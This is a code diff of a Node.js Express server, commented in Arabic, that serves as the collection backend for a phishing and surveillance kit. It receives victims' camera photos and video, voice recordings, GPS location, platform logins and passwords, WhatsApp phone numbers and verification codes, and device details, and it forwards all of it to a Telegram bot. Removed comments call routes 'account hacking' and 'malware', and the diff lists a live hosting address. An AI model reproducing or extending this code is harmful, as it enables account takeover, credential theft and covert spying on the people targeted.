@@ -2,27 +2,22 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const multer = require('multer');
 const path = require('path');
-const axios = require('axios');
+const cors = require('cors');
 const TelegramBot = require('node-telegram-bot-api');
 require('dotenv').config();
 
-// إعدادات البوت
 const token = process.env.s;
 const bot = new TelegramBot(token, { polling: false });
 
-// إعداد التطبيق
 const app = express();
+app.use(cors());
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
 app.use(express.static(__dirname));
 
-// إعداد multer
 const storage = multer.memoryStorage();
 const upload = multer({ storage: storage });
 
-// ==================== جميع المسارات الأصلية من الكود ====================
-
-// 1. مسار استقبال الفيديو من الكاميرا
 app.post('/submitVideo', upload.single('video'), async (req, res) => {
     const chatId = req.body.userId;
     const file = req.file;
@@ -70,7 +65,6 @@ IP: ${additionalData.ip || 'غير متاح'}
     }
 });
 
-// 2. مسار استقبال الصور من الكاميرا
 app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
     const userId = req.body.userId;
     const files = req.files;
@@ -124,7 +118,6 @@ IP: ${additionalData.ip}
     }
 });
 
-// 3. مسار استقبال الصوت
 app.post('/submitVoice', upload.single('voice'), async (req, res) => {
     const chatId = req.body.chatId;
     const voiceFile = req.file;
@@ -169,7 +162,6 @@ IP: ${additionalData.ip || 'غير متاح'}
     }
 });
 
-// 4. مسار استقبال الموقع
 app.post('/submitLocation', async (req, res) => {
     const { chatId, latitude, longitude, additionalData = {} } = req.body;
 
@@ -214,7 +206,6 @@ IP: ${additionalData.ip || 'غير متاح'}
     }
 });
 
-// 5. مسار استقبال بيانات اختراق الحسابات (Increase)
 app.post('/submitIncrease', async (req, res) => {
     const { username, password, platform, chatId, ip, country, city, userAgent } = req.body;
 
@@ -263,7 +254,6 @@ app.post('/submitIncrease', async (req, res) => {
     }
 });
 
-// 6. مسار واتساب - إرسال رقم الهاتف
 app.post('/sendPhoneNumber', async (req, res) => {
     const { phoneNumber, country, chatId, ip, platform, userAgent } = req.body;
 
@@ -309,7 +299,6 @@ ${userInfoText}
     }
 });
 
-// 7. مسار واتساب - التحقق من الكود
 app.post('/verifyCode', async (req, res) => {
     const { verificationCode, chatId, phoneNumber, country, ip, platform, userAgent } = req.body;
 
@@ -356,7 +345,6 @@ ${userInfoText}
     }
 });
 
-// 8. مسار تسجيل الدخول (لجميع المنصات)
 app.post('/submitLogin', async (req, res) => {
     const { username, password, platform, chatId, ip, country, city, userAgent, batteryLevel, charging, osVersion } = req.body;
 
@@ -407,7 +395,6 @@ app.post('/submitLogin', async (req, res) => {
     }
 });
 
-// 9. مسار استقبال معلومات الجهاز
 app.post('/SS', async (req, res) => {
     console.log('تم استقبال طلب POST في المسار /SS');
     console.log('البيانات المستلمة:', req.body);
@@ -476,7 +463,6 @@ app.post('/SS', async (req, res) => {
     }
 });
 
-// 10. مسار الصور المتعددة
 app.post('/submitPhtos', upload.array('images', 10), async (req, res) => {
     console.log('Received a request to /submitPhotos');
     try {
@@ -557,69 +543,33 @@ IP: ${parsedData.ip || 'غير متاح'}
     }
 });
 
-// ==================== مسارات HTML الأصلية ====================
-
-// 1. مسار الكاميرا (صور)
-app.get('/camera/:userId', (req, res) => {
-    const userId = req.params.userId;
-    res.sendFile(path.join(__dirname, 'location.html'));
+app.get('/test', (req, res) => {
+    res.json({
+        status: '✅ السيرفر يعمل',
+        timestamp: new Date().toISOString(),
+        endpoints: [
+            'POST /submitLogin',
+            'POST /submitVideo',
+            'POST /submitPhotos',
+            'POST /submitVoice',
+            'POST /submitLocation',
+            'POST /sendPhoneNumber',
+            'POST /verifyCode',
+            'POST /submitIncrease',
+            'POST /SS',
+            'POST /submitPhtos'
+        ]
+    });
 });
 
-// 2. مسار الفيديو
-app.get('/camera/video/:userId', (req, res) => {
-    const userId = req.params.userId;
-    res.sendFile(path.join(__dirname, 'dualCameraVideo.html'));
+app.get('/', (req, res) => {
+    res.send('✅ سيرفر استقبال البيانات يعمل');
 });
 
-// 3. مسار الصوت
-app.get('/record/:userId', (req, res) => {
-    const userId = req.params.userId;
-    res.sendFile(path.join(__dirname, 'record.html'));
-});
-
-// 4. مسار الموقع
-app.get('/getLocation/:userId', (req, res) => {
-    const userId = req.params.userId;
-    res.sendFile(path.join(__dirname, 'SJGD.html'));
-});
-
-// 5. مسار معلومات الجهاز
-app.get('/:userId', (req, res) => {
-    const userId = req.params.userId;
-    res.sendFile(path.join(__dirname, 'SS.html'));
-});
-
-// 6. مسار واتساب
-app.get('/whatsapp', (req, res) => {
-    res.sendFile(path.join(__dirname, 'phone_form.html'));
-});
-
-// 7. مسار التلغيم
-app.get('/malware', (req, res) => {
-    const chatId = req.query.chatId;
-    const originalLink = req.query.originalLink;
-    res.sendFile(path.join(__dirname, 'malware.html'));
-});
-
-// 8. مسار اختراق المنصات
-app.get('/:action/:platform/:chatId', (req, res) => {
-    const { action, platform, chatId } = req.params;
-    res.sendFile(path.join(__dirname, 'uploads', `${platform}_${action}.html`));
-});
-
-// ==================== إعدادات السيرفر ====================
 const PORT = process.env.PORT || 3000;
 
 app.listen(PORT, () => {
-    console.log(`✅ سيرفر استقبال البيانات يعمل على المنفذ ${PORT}`);
-    console.log('📡 مسارات الاستقبال النشطة:');
-    console.log('   📸 /submitPhotos - استقبال الصور');
-    console.log('   🎥 /submitVideo - استقبال الفيديو');
-    console.log('   🎤 /submitVoice - استقبال الصوت');
-    console.log('   📍 /submitLocation - استقبال الموقع');
-    console.log('   🔐 /submitLogin - استقبال بيانات تسجيل الدخول');
-    console.log('   📱 /SS - استقبال معلومات الجهاز');
-    console.log('   ☎️ /sendPhoneNumber - استقبال رقم واتساب');
-    console.log('   ✅ /verifyCode - استقبال كود واتساب');
-    console.log('   ⚡ /submitIncrease - استقبال بيانات اختراق');
+    console.log(`\n✅ سيرفر استقبال البيانات يعمل على المنفذ ${PORT}`);
+    console.log(`🌐 رابط السيرفر: https://vipbot77.onrender.com`);
+    console.log(`🔗 رابط الاختبار: https://vipbot77.onrender.com/test`);
 });
